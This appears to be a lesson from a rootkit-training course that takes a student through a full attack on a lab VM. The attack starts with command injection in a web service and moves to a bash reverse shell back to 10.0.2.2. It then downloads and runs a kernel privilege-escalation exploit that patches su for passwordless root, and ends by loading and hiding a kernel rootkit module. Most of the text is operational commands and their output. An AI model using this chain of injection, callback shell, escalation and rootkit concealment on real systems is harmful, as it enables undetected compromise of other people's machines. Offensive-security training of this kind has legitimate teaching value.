# D00: Deploy

## Mission

Every exercise so far started with a root shell on the target.
That is almost never the starting position.

Deploying a rootkit means chaining several stages:

1. Find an entry point.
2. Turn it into code execution.
3. Escalate privileges.
4. Transfer the payload.
5. Load it through whatever access you earned at each step.

D00 puts you through this kill chain against a live target.
You start with nothing but HTTP access to a service and end with a concealed,
operational rootkit.

## What you will observe

- Command injection on a web service gives initial access
- A privilege escalation exploit (CVE-2026-31431) turns uid 1000 into root
- Your rootkit module loads, hides, and responds to commands on a live target

## Workspace

No learner files to edit.
This exercise is operational: follow the phases below using a browser, terminal,
and the staged assets.

## Target

```text
HOST                                    TARGET VM
+-------------------+                   +------------------------+
| rklings.ko        |                   | status-check :8080     |
| copy_fail_exp.py  |                   | runs as uid 1000       |
|                   |                   | no SSH, no sudo        |
+--------+----------+                   +-----------+------------+
         |        http://127.0.0.1:8088             |
         +----------------------------------------->|
```

The target runs Ubuntu 24.04 with kernel **6.8.0-101-generic**.
This kernel version was chosen because it is vulnerable to CVE-2026-31431.

The HTTP service is forwarded to `http://127.0.0.1:8088` on the host.
It runs as `student` (uid 1000) with no sudo privileges.
There is no learner SSH access to the guest.

`10.0.2.2` is the QEMU user-network address of the host, reachable from the
guest.

## Assets

`rklings run D00` builds and stages two files on the host:

| File               | Purpose                                                |
| ------------------ | ------------------------------------------------------ |
| `rklings.ko`       | Your M01 module, built for the 6.8.0-101 target kernel |
| `copy_fail_exp.py` | CVE-2026-31431 privilege escalation                    |

Their path is printed at startup.

## CVE-2026-31431: Copy Fail

The 6.8.0-101 kernel has a page cache corruption bug in the AF_ALG splice path:

- Userspace splices data through an AEAD crypto socket
- The kernel skips a copy-on-write check on the destination page
- An unprivileged process can overwrite read-only file mappings in the page
  cache, including setuid binaries

The supplied exploit:

- Patches `/usr/bin/su` in memory so it drops to root without a password
- Leaves the binary on disk unchanged
- The corruption lives in the page cache until the next reboot

Same class of bug as CVE-2022-0847 (Dirty Pipe), applied to a different splice
path.

## Phase 1: Initial access

The status service resolves hostnames with this handler:

```python
result = subprocess.run(
    f"getent hosts {host}",
    shell=True,
    capture_output=True,
    text=True,
)
```

The `host` parameter is interpolated directly into a shell command.
A semicolon terminates `getent` and starts a new command.

Open `http://127.0.0.1:8088` in a browser.
Type `;id` in the host field and submit:

```text
uid=1000(student) gid=1000(student) groups=1000(student)
```

That proves code execution as `student`.

One-shot HTTP responses are awkward for multi-step work.
A callback shell gives you a persistent interactive session: the target connects
back to a listener you run on the host.

Start a listener on the host:

```console
host:~$ nc -lvp 4444
```

Submit a reverse shell through the web interface.
A bash one-liner works:

```text
;bash -i >& /dev/tcp/10.0.2.2/4444 0>&1
```

See https://getrev.sh for other payloads.
Once the callback lands on the listener:

```console
student@target:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
```

## Phase 2: Serve the assets

The exploit and the module are on the host.
The target can reach the host at `10.0.2.2`.
Serve the staged directory over HTTP from a second host terminal:

```console
host:~$ python3 -m http.server 9000 --directory .rklings/build/local-control-deployment
```

## Phase 3: Privilege escalation

Loading a kernel module requires root.
From the callback shell, transfer the exploit and run it:

```console
student@target:~$ cd /tmp
student@target:/tmp$ curl -fO http://10.0.2.2:9000/copy_fail_exp.py
student@target:/tmp$ python3 copy_fail_exp.py
student@target:/tmp$ su
root@target:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

The exploit patched `/usr/bin/su` in the page cache.
Running `su` drops to root without a password.

## Phase 4: Deploy and conceal

Transfer the module and load it:

```console
root@target:/tmp# curl -fO http://10.0.2.2:9000/rklings.ko
root@target:/tmp# insmod rklings.ko
```

Hide the module and confirm the control interface still responds:

```console
root@target:/tmp# mkdir rklings.h.m
root@target:/tmp# lsmod | grep rklings
root@target:/tmp# mkdir rklings.ping
root@target:/tmp# dmesg | tail -1
rklings: pong
```

`lsmod` returns nothing.
The module still answers.

## Phase 5: Completion

On the host, while the lab is still running:

```console
host:~$ rklings complete D00
[+] completed D00: module operational and concealed
```

`rklings complete` connects through a management channel, sends a ping, and
verifies the module is hidden from `lsmod`.

## Test it

```console
host:~$ rklings run D00
```

## Validate

```console
host:~$ rklings validate D00
```

## Next

You deployed by hand: injection, callback, escalation, transfer, load, hide.

L14 starts automating this.
The kernel module launches a userspace agent on its own, so the operator never
needs a manual shell session on the target.
